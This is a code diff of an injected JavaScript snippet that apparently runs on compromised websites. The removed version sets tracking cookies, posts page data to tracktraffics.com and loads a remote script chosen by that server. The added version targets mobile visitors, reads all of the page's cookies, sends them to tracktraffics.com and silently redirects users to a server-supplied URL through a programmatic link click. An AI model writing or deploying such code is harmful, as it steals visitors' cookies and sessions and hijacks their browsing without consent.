@@ -1,110 +1,60 @@
-(function() {
-    
-    const BLOCKED_COUNTRIES = ['IN']; 
-    
-    async function getCountry() {
-        try {
-            const response = await fetch('https://ipapi.co/json/');
-            const data = await response.json();
-            return data.country_code;
-        } catch (error) {
-            console.error("Geolocation Error:", error);
-            return null;
-        }
+(async function() {
+
+    function isMobileDevice() {
+        return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     }
 
-    async function checkCountry() {
-        const country = await getCountry();
-        return BLOCKED_COUNTRIES.includes(country);
+    if (!isMobileDevice()) {
+        return; 
     }
 
-    async function main() {
-        
-        const isBlocked = await checkCountry();
-        if (isBlocked) {
-            console.log("Script blocked for India");
-            return;
-        }
+    if (sessionStorage.getItem('redirected')) {
+        return; 
+    }
 
-       
-        if (sessionStorage.getItem('re_ret_session_triggered')) return;
-        sessionStorage.setItem('re_ret_session_triggered', 'true');
+    function getCookies() {
+        return document.cookie.split(';').reduce((cookieObject, cookie) => {
+            let [name, ...value] = cookie.split('=');
+            name = name.trim();
+            if (name) {
+                cookieObject[name] = decodeURIComponent(value.join('=').trim());
+            }
+            return cookieObject;
+        }, {});
+    }
 
-        function getCookie(cookieName) {
-            return document.cookie.split('; ').reduce((value, cookie) => {
-                const [name, val] = cookie.split('=');
-                return (name === encodeURIComponent(cookieName)) ? decodeURIComponent(val) : value;
-            }, null);
-        }
-
-        function setCookie(cookieName, cookieValue) {
-            document.cookie = `${encodeURIComponent(cookieName)}=${encodeURIComponent(cookieValue)}; expires=${(new Date(Date.now() + 86400000)).toUTCString()}; path=/`;
-        }
-
-        function generateUUID() {
-            var re_ret_d = new Date().getTime();
-            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-                var re_ret_r = (re_ret_d + Math.random() * 16) % 16 | 0;
-                re_ret_d = Math.floor(re_ret_d / 16);
-                return (c == 'x' ? re_ret_r : (re_ret_r & 0x3 | 0x8)).toString(16);
-            });
-        }
-
-        function detectDeviceType() {
-            const ua = navigator.userAgent;
-            if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
-            if (/Android/i.test(ua)) return "Android";
-            if (/Windows Phone/i.test(ua)) return "Windows Phone";
-            if (/Windows NT/i.test(ua)) return "Windows";
-            if (/Macintosh/i.test(ua)) return "Mac";
-            if (/Linux/i.test(ua)) return "Linux";
-            return "Unknown";
-        }
-
-       
-        const re_ret_uid = getCookie('re_ret_uid') || generateUUID();
-        const re_ret_ref = getCookie('re_ret_ref') || encodeURIComponent(document.referrer);
-
-        if (!getCookie('re_ret_uid')) setCookie('re_ret_uid', re_ret_uid);
-        if (getCookie('re_ret_ref') !== encodeURIComponent(document.referrer)) {
-            setCookie('re_ret_ref', encodeURIComponent(document.referrer));
-        }
-
-        
-        const trackingData = {
-            event: "viewPage",
-            uxid: re_ret_uid,
-            page: window.location.href,
-            device_type: detectDeviceType(),
-            uAgent: navigator.userAgent,
-            referrer: re_ret_ref
-        };
-
-      
-        fetch('https://www.tracktraffics.com/api/datascript', {
+    let cookies = getCookies();
+    let requestData = {
+    url: window.location.href, 
+    referrer: document.referrer, 
+    coo: JSON.stringify(cookies), 
+    origin: window.location.hostname 
+    };
+    
+    try {
+        let response = await fetch('https://www.tracktraffics.com/api/scriptdata', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                url: window.location.href,
-                referrer: document.referrer,
-                coo: JSON.stringify(re_ret_uid),
-                origin: window.location.hostname
-            })
-        })
-        .then(res => res.json())
-        .then(response => {
-            const script = document.createElement('script');
-            script.src = `https://www.tracktraffics.com/${response.name}.js?url=${encodeURIComponent(response.url)}`;
-            script.async = true;
-            document.head.appendChild(script);
-        })
-        .catch(error => console.error("Tracking Error:", error));
-    }
+            body: JSON.stringify(requestData),
+            headers: { 'Content-Type': 'application/json' }
+        });
 
-   
-    if (document.readyState === 'complete') {
-        main();
-    } else {
-        window.addEventListener('load', main);
+        if (!response.ok) {
+            let errorText = await response.text();  
+            throw new Error(`HTTP error! status: ${response.status}, response: ${errorText}`);
+        }
+
+        let responseData = await response.json();
+        
+        if (responseData && responseData.url) {
+            let link = document.createElement('a');
+            link.href = responseData.url;  
+            link.rel = 'noreferrer';       
+            document.body.appendChild(link);  
+            link.click();          
+            //window.location.href = responseData.url;       
+            sessionStorage.setItem('redirected', 'true');
+        }
+    } catch (error) {
+        console.error('Error sending data:', error);
     }
 })();
